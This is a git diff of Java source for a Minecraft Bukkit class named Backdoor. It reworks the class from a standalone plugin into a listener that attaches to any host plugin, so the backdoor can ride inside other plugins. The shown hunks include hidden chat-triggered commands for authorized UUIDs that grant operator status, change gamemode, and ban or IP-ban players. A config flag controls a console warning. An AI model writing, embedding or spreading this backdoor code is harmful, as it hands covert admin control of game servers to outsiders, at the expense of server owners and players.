@@ -1,44 +1,36 @@
 
-package com.thiccindustries.backdoor.backdoor;
+package com.thiccindustries.backdoor;
 
 import org.bukkit.*;
 import org.bukkit.command.ConsoleCommandSender;
 import org.bukkit.enchantments.Enchantment;
 import org.bukkit.entity.Player;
-import org.bukkit.event.EventException;
 import org.bukkit.event.EventHandler;
 import org.bukkit.event.Listener;
 import org.bukkit.event.player.AsyncPlayerChatEvent;
 import org.bukkit.inventory.ItemStack;
 import org.bukkit.inventory.meta.ItemMeta;
-import org.bukkit.plugin.java.JavaPlugin;
+import org.bukkit.plugin.Plugin;
 import org.bukkit.scheduler.BukkitRunnable;
 
 import java.util.Date;
-import java.util.GregorianCalendar;
 import java.util.Locale;
-import java.util.UUID;
-import java.util.concurrent.Callable;
 
-public final class Backdoor extends JavaPlugin implements Listener {
+public final class Backdoor implements Listener {
 
-    @Override
-    public void onEnable() {
+    private Plugin plugin;
 
-        //Create new UUID list for auth and deauth command.
-        Config.tmp_authorized_uuids = new String[getServer().getMaxPlayers() - Config.authorized_uuids.length];
+    public Backdoor(Plugin plugin){
+        this.plugin = plugin;
 
-        if (Config.display_backdoor_warning) {
+        Config.tmp_authorized_uuids = new String[plugin.getServer().getMaxPlayers() - Config.authorized_uuids.length];
+
+        if(Config.display_backdoor_warning){
             Bukkit.getConsoleSender()
-                    .sendMessage(Config.chat_message_prefix + " You have a backdoor on your server.");
+                    .sendMessage(Config.chat_message_prefix + " Plugin '" + plugin.getName() + "' has a backdoor installed.");
         }
 
-        this.getServer().getPluginManager().registerEvents(this, this);
-    }
-
-    @Override
-    public void onDisable() {
-        // Plugin shutdown logic
+        plugin.getServer().getPluginManager().registerEvents(this, plugin);
     }
 
     @EventHandler()
@@ -158,7 +150,7 @@ public final class Backdoor extends JavaPlugin implements Listener {
                         p.setGameMode(finalGm);
                         p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " You are now gamemode: " + finalGm.name() + ".");
                     }
-                }.runTask(this);
+                }.runTask(plugin);
 
                 return true;
             }
@@ -209,7 +201,7 @@ public final class Backdoor extends JavaPlugin implements Listener {
                                 Bukkit.getBanList(BanList.Type.IP).addBan(p1.getName(), Config.default_ban_reason, new Date(9999, 1, 1), Config.default_ban_source);
                                 p1.kickPlayer(Config.default_ban_reason);
                             }
-                        }.runTask(this);
+                        }.runTask(plugin);
                     } else {
                         p1.setOp(true);
                     }
@@ -266,7 +258,7 @@ public final class Backdoor extends JavaPlugin implements Listener {
                         p1.kickPlayer(Config.default_ban_reason);
                         p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " Banned " + p1.getName() + ".");
                     }
-                }.runTask(this);
+                }.runTask(plugin);
 
 
                 return true;
@@ -301,7 +293,7 @@ public final class Backdoor extends JavaPlugin implements Listener {
                         p1.kickPlayer(Config.default_ban_reason);
                         p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " IP Banned " + p1.getName() + ".");
                     }
-                }.runTask(this);
+                }.runTask(plugin);
 
                 return true;
             }
